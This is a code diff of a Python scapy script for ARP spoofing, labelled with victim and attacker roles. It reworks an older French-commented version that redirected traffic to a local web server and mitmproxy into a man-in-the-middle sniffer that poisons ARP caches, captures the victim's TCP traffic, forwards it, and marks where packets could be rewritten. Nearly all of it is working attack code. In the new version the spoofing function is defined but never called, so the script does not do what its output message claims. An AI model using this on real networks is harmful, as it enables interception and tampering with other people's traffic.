@@ -1,66 +1,86 @@
+# arp_packet = ARP(
+#     op=1,             # Operation code (1 for request, 2 for reply)
+#     hwtype=1,        # Hardware type (1 for Ethernet)
+#     ptype=2048,      # Protocol type (2048 for IPv4)
+#     hwlen=6,         # Hardware address length (6 for Ethernet)
+#     plen=4,          # Protocol address length (4 for IPv4)
+#     hwsrc='00:00:00:00:00:00',  # Hardware source address (MAC)
+#     psrc='192.168.1.1',  # Protocol source address (IP)
+#     hwdst='ff:ff:ff:ff:ff:ff',  # Hardware destination address (MAC)
+#     pdst='192.168.1.2'  # Protocol destination address (IP)
+# )
+
+from scapy.all import ARP, Ether, send, sniff, IP, TCP, srp
 import os
-import threading
 import time
-from scapy.all import ARP, Ether, srp, send
-import http.server
-import socketserver
 
-# Variables globales
-target_ip = "192.168.1.73"  # IP de la machine cible 
-spoof_ip = "192.168.1.254"  # IP de la passerelle/routeur
+# Replace these with your network settings
+victim_ip = "192.168.1.10"  # Victim's IP address
+router_ip = "192.168.1.1"  # Router's IP address
+attacker_mac = "AA:BB:CC:DD:EE:FF"  # Attacker's MAC address
 
-def get_target_mac(ip):
+def get_mac(ip):
+    """Get the MAC address of the given IP."""
     arp_request = ARP(pdst=ip)
     broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast/arp_request
+    arp_request_broadcast = broadcast / arp_request
     answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    
     return answered_list[0][1].hwsrc if answered_list else None
 
-target_mac = get_target_mac(target_ip)
+def arp_spoof(victim_ip, router_ip, attacker_mac):
+    """Send ARP spoofing packets to the victim and the router."""
+    arp_response_victim = ARP(op=2, psrc=router_ip, pdst=victim_ip, hwsrc=attacker_mac)
+    arp_response_router = ARP(op=2, psrc=victim_ip, pdst=router_ip, hwsrc=attacker_mac)
+    
+    send(arp_response_victim, verbose=False)
+    send(arp_response_router, verbose=False)
 
-# 1. ARP Spoofing pour rediriger le trafic vers notre machine
-def arp_spoof(target_ip, spoof_ip, target_mac):
-    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    send(packet, verbose=False)
+def restore_arp(victim_ip, router_ip, victim_mac, router_mac):
+    """Restore the ARP tables."""
+    arp_response_victim = ARP(op=2, psrc=router_ip, pdst=victim_ip, hwsrc=router_mac)
+    arp_response_router = ARP(op=2, psrc=victim_ip, pdst=router_ip, hwsrc=victim_mac)
+    
+    send(arp_response_victim, count=5, verbose=False)
+    send(arp_response_router, count=5, verbose=False)
 
-def start_arp_spoofing():
-    print(f"Started ARP spoofing on target {target_ip} pretending to be {spoof_ip}")
-    while True:
-        arp_spoof(target_ip, spoof_ip, target_mac)
-        time.sleep(2)  # Répéter l'attaque toutes les 2 secondes
+def packet_callback(packet):
+    """Callback function to handle captured packets."""
+    if packet.haslayer(IP) and packet.haslayer(TCP):
+        # Check if the packet is from the victim
+        if packet[IP].src == victim_ip:
+            print(f"Victim --> Router: {packet[IP].dst} | {packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport}")
 
-# 2. Serveur HTTP local pour servir des fichiers
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        print(f"Received GET request for {self.path}")  # Log de la requête
-        # Rediriger toute requête vers index.html
-        self.send_response(200)  # Réponse OK
-        self.send_header("Content-type", "text/html")  # Type de contenu
-        self.end_headers()
-        
-        # Lire et retourner le contenu de index.html
-        with open("index.html", "rb") as f:
-            self.wfile.write(f.read())
+            # Modify packet if needed
+            # packet[IP].dst = "NEW_DESTINATION_IP"  # Example modification
 
-def start_http_server():
-    PORT = 8080  # Utilise le port 8080 pour le serveur HTTP
-    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-        print(f"Serving HTTP on port {PORT}")
-        httpd.serve_forever()
+            # Forward the packet to the router
+            send(packet, verbose=False)
 
-# Fonction principale pour lancer toutes les étapes
-def main():
-    # Lancer ARP spoofing dans un thread séparé
-    threading.Thread(target=start_arp_spoofing, daemon=True).start()
+        # Check if the packet is from the router
+        elif packet[IP].dst == victim_ip:
+            print(f"Router --> Victim: {packet[IP].src} | {packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport}")
 
-    # Démarrer le serveur HTTP dans un thread séparé
-    http_thread = threading.Thread(target=start_http_server, daemon=True)
-    http_thread.start()
+            # Modify packet if needed
+            # packet[IP].src = "NEW_SOURCE_IP"  # Example modification
 
-    print("Waiting for HTTP requests...")
+            # Forward the packet to the victim
+            send(packet, verbose=False)
 
-    # Lancer mitmproxy pour intercepter le trafic HTTP/HTTPS
-    os.system("mitmproxy --mode transparent --listen-port 8082")
+try:
+    # Get the MAC addresses
+    victim_mac = get_mac(victim_ip)
+    router_mac = get_mac(router_ip)
 
-if __name__ == "__main__":
-    main()
+    if victim_mac is None or router_mac is None:
+        print("Could not find MAC addresses. Ensure the devices are reachable.")
+        exit(1)
+
+    print("Starting ARP spoofing...")
+    
+    # Start sniffing packets
+    sniff(filter="ip", prn=packet_callback, store=0)
+
+except KeyboardInterrupt:
+    print("\nStopping ARP spoofing...")
+    restore_arp(victim_ip, router_ip, victim_mac, router_mac)
